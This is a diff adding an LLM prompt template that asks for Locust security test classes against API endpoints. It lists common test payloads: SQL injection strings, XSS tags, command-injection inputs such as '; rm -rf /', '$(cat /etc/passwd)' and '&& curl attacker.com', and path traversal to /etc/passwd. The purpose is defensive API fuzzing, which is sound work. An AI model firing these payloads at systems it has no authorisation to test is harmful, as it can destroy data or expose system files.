@@ -1,0 +1,102 @@
+TASK: Generate SECURITY test scenarios for the Locust workflow.
+
+ENDPOINTS TO TEST:
+{{ grouped_endpoints }}
+
+{% if auth_endpoints %}
+AUTHENTICATION ENDPOINTS:
+{{ auth_endpoints }}
+{% endif %}
+
+BASE WORKFLOW (inherit from this):
+{{ base_workflow }}
+
+TEST DATA AVAILABLE:
+{{ test_data_content }}
+
+REQUIREMENTS:
+
+1. **SQL INJECTION TESTS** (weight: 3):
+   Generate @task methods that test SQL injection vulnerabilities:
+   - String fields: `' OR '1'='1`, `'; DROP TABLE users; --`
+   - Numeric fields: `1 OR 1=1`, `1; DELETE FROM users`
+   - UNION-based: `' UNION SELECT * FROM sensitive_data --`
+   - Expect 400/422 rejection, flag 500 as potential vulnerability
+
+2. **XSS (Cross-Site Scripting) TESTS** (weight: 3):
+   Generate @task methods for XSS attempts:
+   - Script tags: `<script>alert('XSS')</script>`
+   - Event handlers: `<img src=x onerror=alert('XSS')>`
+   - SVG/iframe: `<svg onload=alert('XSS')>`
+   - Template injection: `{{constructor.constructor('alert(1)')()}}`
+   - Expect sanitization or rejection
+
+3. **COMMAND INJECTION TESTS** (weight: 2):
+   Generate @task methods for command injection:
+   - Shell operators: `; rm -rf /`, `| cat /etc/passwd`
+   - Backticks/subshells: `` `whoami` ``, `$(cat /etc/passwd)`
+   - Chained commands: `&& curl attacker.com`
+   - Expect 400/422 rejection
+
+4. **PATH TRAVERSAL TESTS** (weight: 2):
+   For endpoints with path parameters (id, slug, file, etc.):
+   - Directory traversal: `../../../etc/passwd`
+   - URL-encoded: `%2e%2e%2f%2e%2e%2f`
+   - Double-encoded: `..%252f..%252f`
+   - Null byte: `/etc/passwd%00.jpg`
+   - Expect 400/404 rejection
+
+5. **AUTHENTICATION BYPASS TESTS** (weight: 2):
+   Generate @task methods for auth bypass attempts:
+   - Missing auth headers - expect 401
+   - Invalid/expired tokens - expect 401/403
+   - JWT manipulation (if applicable)
+   - Privilege escalation attempts
+
+6. **CLASS STRUCTURE**:
+   ```python
+   from base_workflow import BaseWorkflow
+   import test_data
+   import random
+
+   # Security payloads - customize based on endpoint parameters
+   SQL_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", ...]
+   XSS_PAYLOADS = ["<script>alert('XSS')</script>", ...]
+   CMD_PAYLOADS = ["; rm -rf /", "| cat /etc/passwd", ...]
+   PATH_PAYLOADS = ["../../../etc/passwd", ...]
+
+   class {{ class_name }}SecurityWorkflow(BaseWorkflow):
+       """Security tests for {{ tag_name }} endpoints"""
+
+       def _test_injection(self, path: str, method: str, payload: str, attack_type: str):
+           """Helper to test injection and validate response"""
+           # Build malicious data targeting actual endpoint parameters
+           malicious_data = {...}
+
+           with self.client.request(method, path, json=malicious_data, catch_response=True) as response:
+               if response.status_code in [400, 401, 403, 422]:
+                   response.success()  # Properly rejected
+               elif response.status_code == 500:
+                   response.failure(f"SECURITY: {attack_type} may have succeeded - server error")
+               else:
+                   response.success()  # API handled it
+
+       @task(3)
+       def test_sql_injection_endpoint_name(self):
+           """SQL injection test for POST /specific/endpoint"""
+           payload = random.choice(SQL_PAYLOADS)
+           self._test_injection("/specific/endpoint", "POST", payload, "SQL_INJECTION")
+   ```
+
+7. **IMPORTANT**:
+   - Target ACTUAL parameters from the endpoint schemas (name, email, query, id, etc.)
+   - Generate endpoint-specific tests, not generic ones
+   - Use catch_response=True and mark success() for proper rejection
+   - Mark failure() when 500 error indicates potential vulnerability
+   - Include both query param and body injection tests where applicable
+
+OUTPUT:
+Return ONLY valid Python code in <code></code> tags.
+Generate ONE class with security test methods targeting the specific endpoints.
+
+<code>your_complete_python_code_here</code>
